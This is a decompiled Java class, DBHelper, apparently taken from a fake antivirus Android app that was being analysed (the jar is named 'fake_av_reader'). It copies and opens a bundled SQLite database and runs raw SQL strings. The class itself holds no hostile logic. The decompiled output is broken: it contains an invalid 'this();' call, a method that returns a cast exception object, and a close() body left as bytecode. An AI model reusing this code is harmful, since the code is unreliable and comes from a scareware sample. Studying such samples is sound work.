package com.example.androiddefender2;

import android.content.ContentValues;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.SQLException;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.database.sqlite.SQLiteOpenHelper;
import android.widget.Toast;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;

public class DBHelper extends SQLiteOpenHelper {
  static final String DB_NAME = "AndroidDefender.sqlite";
  
  static final int DB_VERSION = 2;
  
  private String DB_PATH = "/data/data/AndroidDefender2/databases/";
  
  private final Context defenderContext;
  
  private SQLiteDatabase defenderDatabase;
  
  public DBHelper(Context paramContext) {
    super(paramContext, "AndroidDefender.sqlite", null, 2);
    this.defenderContext = paramContext;
    PackageManager packageManager = this.defenderContext.getPackageManager();
    String str = this.defenderContext.getPackageName();
    try {
      String str1 = (packageManager.getPackageInfo(str, 0)).applicationInfo.dataDir;
      str = str1;
    } catch (android.content.pm.PackageManager.NameNotFoundException nameNotFoundException) {
      nameNotFoundException.printStackTrace();
    } 
    this.DB_PATH = str + "/databases/";
  }
  
  private boolean checkDataBase() {
    boolean bool = false;
    SQLiteDatabase sQLiteDatabase = null;
    try {
      StringBuilder stringBuilder = new StringBuilder();
      this();
      SQLiteDatabase sQLiteDatabase1 = SQLiteDatabase.openDatabase(stringBuilder.append(this.DB_PATH).append("AndroidDefender.sqlite").toString(), null, 0);
      sQLiteDatabase = sQLiteDatabase1;
    } catch (SQLiteException sQLiteException) {
      sQLiteException.toString();
    } 
    if (sQLiteDatabase != null)
      sQLiteDatabase.close(); 
    if (sQLiteDatabase != null)
      bool = true; 
    return bool;
  }
  
  private void copyDataBase() throws IOException {
    InputStream inputStream = this.defenderContext.getAssets().open("AndroidDefender.sqlite");
    FileOutputStream fileOutputStream = new FileOutputStream(this.DB_PATH + "AndroidDefender.sqlite");
    byte[] arrayOfByte = new byte[1024];
    while (true) {
      int i = inputStream.read(arrayOfByte);
      if (i > 0) {
        fileOutputStream.write(arrayOfByte, 0, i);
        continue;
      } 
      fileOutputStream.flush();
      fileOutputStream.close();
      inputStream.close();
      return;
    } 
  }
  
  public void ExecuteSQLScript(SQLiteDatabase paramSQLiteDatabase, String paramString) {
    try {
      paramSQLiteDatabase.execSQL(paramString);
    } catch (SQLException sQLException) {
      String str = sQLException.toString();
      Toast.makeText(DefenderApplication.getInstance().getApplicationContext(), str, 0).show();
    } 
  }
  
  public void UpdateTable(String paramString1, ContentValues paramContentValues, String paramString2) {
    try {
      getWritableDatabase().update(paramString1, paramContentValues, paramString2, null);
    } catch (Exception exception) {
      exception.toString();
    } 
  }
  
  public boolean checkIssetSQLOneRow(String paramString) {
    boolean bool = false;
    try {
      Cursor cursor = getWritableDatabase().rawQuery(paramString, null);
      int i = cursor.getCount();
      cursor.close();
      if (i > 0)
        bool = true; 
    } catch (Exception exception) {
      exception.toString();
    } 
    return bool;
  }
  
  public void close() {
    // Byte code:
    //   0: aload_0
    //   1: monitorenter
    //   2: aload_0
    //   3: getfield defenderDatabase : Landroid/database/sqlite/SQLiteDatabase;
    //   6: ifnull -> 16
    //   9: aload_0
    //   10: getfield defenderDatabase : Landroid/database/sqlite/SQLiteDatabase;
    //   13: invokevirtual close : ()V
    //   16: aload_0
    //   17: invokespecial close : ()V
    //   20: aload_0
    //   21: monitorexit
    //   22: return
    //   23: astore_1
    //   24: aload_0
    //   25: monitorexit
    //   26: aload_1
    //   27: athrow
    // Exception table:
    //   from	to	target	type
    //   2	16	23	finally
    //   16	20	23	finally
  }
  
  public void createDataBase() throws IOException {
    if (!checkDataBase()) {
      getReadableDatabase();
      try {
        copyDataBase();
        return;
      } catch (IOException iOException) {
        throw new Error("Error copying database");
      } 
    } 
  }
  
  public Cursor getOneScanSettingsRow(String paramString) {
    try {
      Cursor cursor = getWritableDatabase().rawQuery(paramString, null);
      if (cursor.getCount() <= 0) {
        cursor.close();
        cursor = null;
      } 
    } catch (SQLException sQLException) {
      sQLException.toString();
      sQLException = null;
    } 
    return (Cursor)sQLException;
  }
  
  public void onCreate(SQLiteDatabase paramSQLiteDatabase) {}
  
  public void onUpgrade(SQLiteDatabase paramSQLiteDatabase, int paramInt1, int paramInt2) {}
  
  public void openDataBase() throws SQLException {
    this.defenderDatabase = SQLiteDatabase.openDatabase(this.DB_PATH + "AndroidDefender.sqlite", null, 16);
  }
}


/* Location:              /home/fahim/Desktop/fake_av_reader-dex2jar.jar!/com/example/androiddefender2/DBHelper.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */